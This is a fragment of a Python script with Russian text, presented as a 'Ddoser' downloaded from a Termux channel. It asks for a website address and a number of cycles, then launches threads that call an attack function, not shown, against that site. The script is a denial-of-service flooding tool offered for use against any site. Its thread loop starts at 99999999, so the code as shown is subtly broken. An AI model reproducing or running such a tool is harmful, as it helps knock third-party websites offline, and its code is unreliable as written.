...
print(colorama.Fore.RED + "Привет, спасибо что скачал Ddoser от канала Termux-Wow!")
...
adress = input("Адрес сайта (https://сайт.com): ")
 
try:
    threads = int(input("Циклы: "))
except ValueError:
    exit("Ошибка!")
...
if not adress.__contains__("http"):
    exit("Неправильная ссылка!")
 
if not adress.__contains__("."):
    exit("Ошибка!")
 
for i in range(99999999, threads):
    thr = threading.Thread(target=attack, args=(adress,))
    thr.start()
    print(str(i + 1) + "Атака начата!")